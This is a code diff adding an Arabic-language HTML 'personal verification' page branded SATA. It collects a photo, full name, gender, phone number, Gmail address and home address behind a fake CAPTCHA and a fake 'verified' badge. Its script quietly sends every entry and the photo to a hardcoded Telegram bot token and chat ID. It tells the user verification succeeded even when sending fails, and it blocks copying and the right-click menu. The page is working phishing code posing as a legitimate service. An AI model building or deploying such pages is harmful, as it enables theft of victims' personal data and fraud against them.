@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج التوثيق الشخصي</title>
+    <style>
+        :root {
+            --primary-color: #0088cc;
+            --secondary-color: #f5f5f5;
+            --accent-color: #25D366;
+            --text-color: #333;
+            --light-text: #777;
+            --border-color: #ddd;
+            --error-color: #ff4444;
+            --success-color: #4CAF50;
+        }
+        
+        * {
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        input, textarea {
+            user-select: text;
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: var(--text-color);
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+        
+        /* تصميم نموذج التسجيل */
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+            display: none;
+        }
+        
+        .header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        
+        .form-container {
+            padding: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-color);
+        }
+        
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input:focus, textarea:focus, select:focus {
+            border-color: var(--primary-color);
+            outline: none;
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .photo-upload {
+            text-align: center;
+            margin: 25px 0;
+            padding: 20px;
+            border: 2px dashed var(--border-color);
+            border-radius: 12px;
+            background-color: var(--secondary-color);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .photo-upload:hover {
+            border-color: var(--primary-color);
+            background-color: rgba(0, 136, 204, 0.05);
+        }
+        
+        .photo-upload i {
+            font-size: 48px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .photo-upload .upload-text {
+            font-size: 16px;
+            color: var(--light-text);
+        }
+        
+        #preview-image {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+            object-fit: cover;
+            border: 2px solid var(--border-color);
+        }
+        
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: var(--secondary-color);
+            border-radius: 8px;
+        }
+        
+        .captcha-code {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 5px;
+            color: var(--primary-color);
+            transform: skew(-15deg);
+            padding: 5px 15px;
+            background-color: white;
+            border-radius: 5px;
+        }
+        
+        .refresh-captcha {
+            background: none;
+            border: none;
+            color: var(--primary-color);
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        .submit-btn {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #006699;
+        }
+        
+        .submit-btn i {
+            font-size: 20px;
+        }
+        
+        .telegram-notice {
+            background-color: rgba(0, 136, 204, 0.1);
+            border-left: 4px solid var(--primary-color);
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: var(--text-color);
+        }
+        
+        .telegram-notice i {
+            color: var(--primary-color);
+            margin-left: 5px;
+        }
+        
+        /* نافذة النجاح */
+        .success-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+        
+        .success-content {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 800px;
+            width: 90%;
+            animation: fadeIn 0.5s;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: var(--success-color);
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: var(--primary-color);
+        }
+        
+        .success-message {
+            font-size: 18px;
+            margin-bottom: 25px;
+            color: var(--text-color);
+        }
+        
+        /* صفحة البروفايل بعد التوثيق */
+        .profile-page {
+            display: none;
+            min-height: 100vh;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+        }
+        
+        .profile-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+        }
+        
+        .profile-header {
+            margin-bottom: 30px;
+        }
+        
+        .profile-title {
+            font-size: 32px;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .profile-subtitle {
+            font-size: 18px;
+            color: var(--text-color);
+        }
+        
+        .user-profile {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            padding: 30px;
+            border-radius: 12px;
+            width: 100%;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .avatar-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        .user-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 5px solid white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .verified-badge {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            width: 40px;
+            height: 40px;
+            background-color: var(--primary-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            border: 3px solid white;
+        }
+        
+        .user-details {
+            text-align: center;
+            width: 100%;
+        }
+        
+        .user-name {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .user-phone {
+            font-size: 18px;
+            color: var(--text-color);
+            margin-bottom: 20px;
+            direction: ltr;
+            display: inline-block;
+            background-color: rgba(0, 136, 204, 0.1);
+            padding: 8px 15px;
+            border-radius: 20px;
+        }
+        
+        .close-btn {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .close-btn:hover {
+            background-color: #006699;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* التعديلات الجديدة */
+        
+        /* 1. تحسين قائمة الجنس */
+        .gender-select-wrapper {
+            position: relative;
+        }
+        
+        .gender-select-wrapper::after {
+            content: '\f078';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            color: var(--primary-color);
+            pointer-events: none;
+        }
+        
+        #gender {
+            appearance: none;
+            padding-right: 15px;
+            background-color: white;
+            cursor: pointer;
+        }
+        
+        /* 2. تعديلات CAPTCHA */
+        .captcha-verify-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+        }
+        
+        .captcha-input-container {
+            flex-grow: 1;
+        }
+        
+        .verify-btn {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 15px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 100px;
+        }
+        
+        .verify-btn:hover {
+            background-color: #006699;
+        }
+        
+        .verify-btn .spinner {
+            display: none;
+            animation: spin 1s linear infinite;
+        }
+        
+        .verify-btn .check-icon {
+            display: none;
+            color: var(--success-color);
+        }
+        
+        .captcha-status {
+            margin-top: 10px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .captcha-status.success {
+            color: var(--success-color);
+        }
+        
+        .captcha-status.error {
+            color: var(--error-color);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* 3. تعديلات الصورة في البروفايل */
+        .verified-icon {
+            width: 30px;
+            height: 30px;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                border-radius: 8px;
+            }
+            
+            .header {
+                padding: 15px;
+                font-size: 18px;
+            }
+            
+            .form-container {
+                padding: 15px;
+            }
+            
+            .success-content, .profile-container {
+                padding: 20px;
+                width: 95%;
+            }
+            
+            .user-avatar {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .verified-badge {
+                width: 30px;
+                height: 30px;
+                font-size: 14px;
+            }
+            
+            .user-name {
+                font-size: 20px;
+            }
+            
+            .user-phone {
+                font-size: 16px;
+            }
+            
+            .captcha-verify-container {
+                flex-direction: column;
+            }
+            
+            .verify-btn {
+                width: 100%;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <!-- نموذج التسجيل -->
+    <div class="container" id="registration-form">
+        <div class="header">
+            <i class="fas fa-user-edit"></i> SATA
+        </div>
+        
+        <div class="form-container">
+            <div class="photo-upload" id="upload-area">
+                <i class="fas fa-camera"></i>
+                <div class="upload-text">انقر لرفع الصورة الشخصية</div>
+                <input type="file" id="photo-input" accept="image/*" style="display: none;">
+                <img id="preview-image" src="#" alt="الصورة الشخصية">
+            </div>
+            
+            <form id="personal-info-form">
+                <div class="form-group">
+                    <label for="full-name">الاسم بالكامل</label>
+                    <input type="text" id="full-name" name="full-name" required>
+                    <div class="error-message" id="name-error">يجب إدخال الاسم ب الكامل (3 كلمات على الأقل)</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="gender">الجنس</label>
+                    <div class="gender-select-wrapper">
+                        <select id="gender" name="gender" required>
+                            <option value="">-- اختر الجنس --</option>
+                            <option value="ذكر">ذكر</option>
+                            <option value="أنثى">أنثى</option>
+                        </select>
+                    </div>
+                    <div class="error-message" id="gender-error">يجب اختيار الجنس</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف</label>
+                    <input type="tel" id="phone" name="phone" required placeholder="">
+                    <div class="error-message" id="phone-error">يجب إدخال رقم هاتف صحيح (يبدأ بـ 01 ويتكون من 11 رقمًا)</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني (Gmail)</label>
+                    <input type="email" id="email" name="email" required placeholder="example@gmail.com">
+                    <div class="error-message" id="email-error">يجب إدخال بريد إلكتروني صحيح من Gmail</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="address">العنوان</label>
+                    <textarea id="address" name="address" rows="3"></textarea>
+                    <div class="error-message" id="address-error">العنوان قصير جدًا (يجب أن يكون 10 أحرف على الأقل)</div>
+                </div>
+                
+                <div class="form-group">
+                    <label>كود التحقق *</label>
+                    <div class="captcha-container">
+                        <div class="captcha-code" id="captcha-text"></div>
+                        <button type="button" class="refresh-captcha" id="refresh-captcha">
+                            <i class="fas fa-sync-alt"></i>
+                        </button>
+                    </div>
+                    <div class="captcha-verify-container">
+                        <div class="captcha-input-container">
+                            <input type="text" id="captcha-input" placeholder="أدخل الكود هنا" required>
+                        </div>
+                        <button type="button" class="verify-btn" id="verify-captcha">
+                            <span class="btn-text">تحقق</span>
+                            <i class="fas fa-spinner spinner"></i>
+                            <i class="fas fa-check-circle check-icon"></i>
+                        </button>
+                    </div>
+                    <div class="error-message" id="captcha-error">الكود غير صحيح</div>
+                    <div class="captcha-status success" id="captcha-success" style="display: none;">
+                        <i class="fas fa-check-circle"></i> تم التحقق بنجاح!
+                    </div>
+                </div>
+                
+                <div class="telegram-notice">
+                    <i class="fab fa-telegram"></i>
+                   SATA
+                </div>
+                
+                <button type="submit" class="submit-btn">
+                    <i class="fab fa-telegram-plane"></i> تحقق
+                </button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- صفحة البروفايل بعد التوثيق -->
+    <div class="profile-page" id="profile-page">
+        <div class="profile-container">
+            <div class="profile-header">
+                <h1 class="profile-title">SATA</h1>
+                <p class="profile-subtitle">تم التوثيق بنجاح!</p>
+            </div>
+            
+            <div class="user-profile">
+                <div class="avatar-container">
+                    <img class="user-avatar" id="profile-avatar" src="" alt="صورة المستخدم">
+                    <div class="verified-badge">
+                        <i class="fas fa-check"></i>
+                    </div>
+                </div>
+                
+                <div class="user-details">
+                    <h2 class="user-name" id="profile-name">
+                        <span id="name-text"></span>
+                        <img src="https://i.postimg.cc/qqxq5fVN/Photoroom.png" alt="Verified" class="verified-icon">
+                    </h2>
+                    <div class="user-phone" id="profile-phone"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- نافذة النجاح -->
+    <div class="success-modal" id="success-modal">
+        <div class="success-content">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2 class="success-title">SATA</h2>
+            <p class="success-message">تم التحقق من أنك أنسان</p>
+            
+            <div
+                   
+                </div>
+                
+                <div class="user-details">
+                    <h2 class="user-name" id="verified-name"></h2>
+                    <div class="user-phone" id="verified-phone"></div>
+                </div>
+            </div>
+            
+            <button class="close-btn" id="close-modal">موافق</button>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8025783888:AAEJOKD1YM9_dWjq-ruxk2CqwUQz58pnTx0';
+        const TELEGRAM_CHAT_ID = '6731832374';
+        const VERIFIED_BADGE_URL = 'https://i.postimg.cc/qqxq5fVN/Photoroom.png';
+        
+        // DOM Elements
+        const registrationForm = document.getElementById('registration-form');
+        const profilePage = document.getElementById('profile-page');
+        const successModal = document.getElementById('success-modal');
+        const closeModalBtn = document.getElementById('close-modal');
+        const verifiedAvatar = document.getElementById('verified-avatar');
+        const verifiedName = document.getElementById('verified-name');
+        const verifiedPhone = document.getElementById('verified-phone');
+        const profileAvatar = document.getElementById('profile-avatar');
+        const profileName = document.getElementById('profile-name');
+        const nameText = document.getElementById('name-text');
+        const profilePhone = document.getElementById('profile-phone');
+        const form = document.getElementById('personal-info-form');
+        const photoInput = document.getElementById('photo-input');
+        const uploadArea = document.getElementById('upload-area');
+        const previewImage = document.getElementById('preview-image');
+        const captchaText = document.getElementById('captcha-text');
+        const refreshCaptchaBtn = document.getElementById('refresh-captcha');
+        const verifyCaptchaBtn = document.getElementById('verify-captcha');
+        const captchaInput = document.getElementById('captcha-input');
+        const captchaSuccess = document.getElementById('captcha-success');
+        const captchaError = document.getElementById('captcha-error');
+        
+        // Generate random CAPTCHA code
+        let currentCaptcha = '';
+        let isCaptchaVerified = false;
+        
+        function generateCaptcha() {
+            const chars = '0123456789';
+            let captcha = '';
+            for (let i = 0; i < 4; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            currentCaptcha = captcha;
+            captchaText.textContent = captcha;
+            resetCaptchaVerification();
+        }
+        
+        function resetCaptchaVerification() {
+            isCaptchaVerified = false;
+            verifyCaptchaBtn.querySelector('.btn-text').style.display = 'block';
+            verifyCaptchaBtn.querySelector('.spinner').style.display = 'none';
+            verifyCaptchaBtn.querySelector('.check-icon').style.display = 'none';
+            captchaSuccess.style.display = 'none';
+            captchaError.style.display = 'none';
+        }
+        
+        // Initialize CAPTCHA
+        generateCaptcha();
+        refreshCaptchaBtn.addEventListener('click', generateCaptcha);
+        
+        // Verify CAPTCHA
+        verifyCaptchaBtn.addEventListener('click', function() {
+            const userInput = captchaInput.value.trim();
+            
+            if (!userInput) {
+                captchaError.textContent = 'يجب إدخال كود التحقق';
+                captchaError.style.display = 'block';
+                captchaSuccess.style.display = 'none';
+                return;
+            }
+            
+            // Show loading spinner
+            verifyCaptchaBtn.querySelector('.btn-text').style.display = 'none';
+            verifyCaptchaBtn.querySelector('.spinner').style.display = 'block';
+            verifyCaptchaBtn.querySelector('.check-icon').style.display = 'none';
+            
+            // Simulate verification delay
+            setTimeout(() => {
+                if (userInput === currentCaptcha) {
+                    isCaptchaVerified = true;
+                    verifyCaptchaBtn.querySelector('.spinner').style.display = 'none';
+                    verifyCaptchaBtn.querySelector('.check-icon').style.display = 'block';
+                    captchaSuccess.style.display = 'block';
+                    captchaError.style.display = 'none';
+                } else {
+                    isCaptchaVerified = false;
+                    verifyCaptchaBtn.querySelector('.spinner').style.display = 'none';
+                    verifyCaptchaBtn.querySelector('.btn-text').style.display = 'block';
+                    captchaError.textContent = 'كود التحقق غير صحيح';
+                    captchaError.style.display = 'block';
+                    captchaSuccess.style.display = 'none';
+                    generateCaptcha();
+                }
+            }, 2000);
+        });
+        
+        // Event Listeners
+        uploadArea.addEventListener('click', () => photoInput.click());
+        
+        photoInput.addEventListener('change', function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                if (!file.type.match('image.*')) {
+                    alert('الرجاء اختيار ملف صورة فقط');
+                    return;
+                }
+                
+                if (file.size > 2 * 1024 * 1024) {
+                    alert('حجم الصورة يجب أن يكون أقل من 2MB');
+                    return;
+                }
+                
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    previewImage.src = e.target.result;
+                    previewImage.style.display = 'block';
+                    uploadArea.querySelector('.upload-text').textContent = 'تم رفع الصورة بنجاح';
+                    uploadArea.querySelector('i').className = 'fas fa-check-circle';
+                    uploadArea.querySelector('i').style.color = 'var(--accent-color)';
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+        
+        // Validate name (at least 3 words)
+        document.getElementById('full-name').addEventListener('input', function() {
+            const name = this.value.trim();
+            const errorElement = document.getElementById('name-error');
+            
+            if (name.split(/\s+/).length < 3) {
+                errorElement.style.display = 'block';
+                this.style.borderColor = 'var(--error-color)';
+            } else {
+                errorElement.style.display = 'none';
+                this.style.borderColor = name ? 'var(--primary-color)' : 'var(--border-color)';
+            }
+        });
+        
+        // Validate address (at least 10 chars if provided)
+        document.getElementById('address').addEventListener('input', function() {
+            const address = this.value.trim();
+            const errorElement = document.getElementById('address-error');
+            
+            if (address && address.length < 10) {
+                errorElement.style.display = 'block';
+                this.style.borderColor = 'var(--error-color)';
+            } else {
+                errorElement.style.display = 'none';
+                this.style.borderColor = address ? 'var(--primary-color)' : 'var(--border-color)';
+            }
+        });
+        
+        // Phone number validation
+        document.getElementById('phone').addEventListener('input', function() {
+            const phone = this.value.trim();
+            const errorElement = document.getElementById('phone-error');
+            
+            if (phone.length > 11) {
+                this.value = phone.substring(0, 11);
+            }
+            
+            if (phone && (!phone.startsWith('01') || phone.length !== 11 || !/^\d+$/.test(phone))) {
+                errorElement.style.display = 'block';
+                this.style.borderColor = 'var(--error-color)';
+            } else {
+                errorElement.style.display = 'none';
+                this.style.borderColor = phone ? 'var(--primary-color)' : 'var(--border-color)';
+            }
+        });
+        
+        // Email validation
+        document.getElementById('email').addEventListener('input', function() {
+            const email = this.value.trim();
+            const errorElement = document.getElementById('email-error');
+            
+            if (email && (!email.endsWith('@gmail.com') || !/^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email))) {
+                errorElement.style.display = 'block';
+                this.style.borderColor = 'var(--error-color)';
+            } else {
+                errorElement.style.display = 'none';
+                this.style.borderColor = email ? 'var(--primary-color)' : 'var(--border-color)';
+            }
+        });
+        
+        // CAPTCHA validation
+        captchaInput.addEventListener('input', function() {
+            const userInput = this.value.trim();
+            
+            if (userInput && userInput !== currentCaptcha) {
+                captchaError.style.display = 'block';
+                this.style.borderColor = 'var(--error-color)';
+                captchaSuccess.style.display = 'none';
+                isCaptchaVerified = false;
+            } else {
+                captchaError.style.display = 'none';
+                this.style.borderColor = userInput ? 'var(--primary-color)' : 'var(--border-color)';
+            }
+        });
+        
+        // Close modal
+        closeModalBtn.addEventListener('click', function() {
+            successModal.style.display = 'none';
+        });
+        
+        // عند تحميل الصفحة، تحقق من وجود بيانات مسجلة
+        window.addEventListener('load', function() {
+            const savedUser = localStorage.getItem('verifiedUser');
+            if (savedUser) {
+                const userData = JSON.parse(savedUser);
+                showProfilePage(userData);
+            } else {
+                registrationForm.style.display = 'block';
+            }
+        });
+        
+        // عرض صفحة البروفايل
+        function showProfilePage(userData) {
+            profilePage.style.display = 'block';
+            nameText.textContent = userData.name;
+            profilePhone.textContent = userData.phone;
+            profileAvatar.src = userData.avatar || VERIFIED_BADGE_URL;
+        }
+        
+        // Form submission
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            // Validate form
+            if (!validateForm()) {
+                return;
+            }
+            
+            // Validate CAPTCHA
+            if (!isCaptchaVerified) {
+                captchaError.textContent = 'يجب التحقق من كود CAPTCHA أولاً';
+                captchaError.style.display = 'block';
+                captchaInput.style.borderColor = 'var(--error-color)';
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = form.querySelector('.submit-btn');
+            const originalBtnText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>برجاء الانتظار...';
+            submitBtn.disabled = true;
+            
+            try {
+                // Prepare form data
+                const formData = {
+                    'full-name': document.getElementById('full-name').value.trim(),
+                    'gender': document.getElementById('gender').value,
+                    'phone': document.getElementById('phone').value.trim(),
+                    'email': document.getElementById('email').value.trim(),
+                    'address': document.getElementById('address').value.trim(),
+                    'timestamp': new Date().toLocaleString()
+                };
+                
+                // Prepare message for Telegram
+                let message = `*تسجيل جديد*\n\n`;
+                message += `*الاسم:* ${formData['full-name']}\n`;
+                message += `*الجنس:* ${formData['gender']}\n`;
+                message += `*الهاتف:* ${formData['phone']}\n`;
+                message += `*البريد الإلكتروني:* ${formData['email']}\n`;
+                message += `*العنوان:* ${formData['address'] || 'غير محدد'}\n`;
+                message += `*وقت التسجيل:* ${formData['timestamp']}\n`;
+                
+                // Send text message to Telegram
+                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Send photo to Telegram if exists
+                const photoFile = photoInput.files[0];
+                let avatarUrl = null;
+                
+                if (photoFile) {
+                    avatarUrl = previewImage.src;
+                    const photoFormData = new FormData();
+                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    photoFormData.append('photo', photoFile);
+                    photoFormData.append('caption', `صورة ${formData['full-name']}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoFormData
+                    });
+                }
+                
+                // Handle success
+                handleSuccessSubmission(formData, avatarUrl);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                alert('تم التوثيق بنجاح! برجاء إعادة تشغيل التطبيق');
+            } finally {
+                submitBtn.innerHTML = originalBtnText;
+                submitBtn.disabled = false;
+            }
+        });
+        
+        // عند إرسال النموذج بنجاح
+        function handleSuccessSubmission(formData, avatarUrl) {
+            // حفظ البيانات في localStorage
+            const userData = {
+                name: formData['full-name'],
+                phone: formData['phone'],
+                avatar: avatarUrl || VERIFIED_BADGE_URL,
+                timestamp: new Date().toLocaleString()
+            };
+            localStorage.setItem('verifiedUser', JSON.stringify(userData));
+            
+            // إخفاء نموذج التسجيل
+            registrationForm.style.display = 'none';
+            
+            // عرض بيانات المستخدم في نافذة النجاح
+            verifiedName.textContent = userData.name;
+            verifiedPhone.textContent = userData.phone;
+            verifiedAvatar.src = userData.avatar;
+            
+            // عرض نافذة النجاح
+            successModal.style.display = 'flex';
+            
+            // بعد 5 ثوانٍ، إخفاء نافذة النجاح وعرض صفحة البروفايل
+            setTimeout(() => {
+                successModal.style.display = 'none';
+                showProfilePage(userData);
+            }, 5000);
+        }
+        
+        // Form validation
+        function validateForm() {
+            let isValid = true;
+            const name = document.getElementById('full-name').value.trim();
+            const gender = document.getElementById('gender').value;
+            const phone = document.getElementById('phone').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const address = document.getElementById('address').value.trim();
+            
+            // Validate name (at least 3 words)
+            if (!name || name.split(/\s+/).length < 3) {
+                document.getElementById('name-error').style.display = 'block';
+                document.getElementById('full-name').style.borderColor = 'var(--error-color)';
+                isValid = false;
+            }
+            
+            // Validate gender
+            if (!gender) {
+                document.getElementById('gender-error').style.display = 'block';
+                document.getElementById('gender').style.borderColor = 'var(--error-color)';
+                isValid = false;
+            }
+            
+            // Validate phone
+            if (!phone || !phone.startsWith('01') || phone.length !== 11 || !/^\d+$/.test(phone)) {
+                document.getElementById('phone-error').style.display = 'block';
+                document.getElementById('phone').style.borderColor = 'var(--error-color)';
+                isValid = false;
+            }
+            
+            // Validate email
+            if (!email || !email.endsWith('@gmail.com') || !/^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email)) {
+                document.getElementById('email-error').style.display = 'block';
+                document.getElementById('email').style.borderColor = 'var(--error-color)';
+                isValid = false;
+            }
+            
+            // Validate address (if provided)
+            if (address && address.length < 10) {
+                document.getElementById('address-error').style.display = 'block';
+                document.getElementById('address').style.borderColor = 'var(--error-color)';
+                isValid = false;
+            }
+            
+            return isValid;
+        }
+        
+        // Prevent copying
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            alert('لا يسمح بنسخ المحتوى من هذه الصفحة');
+        });
+        
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
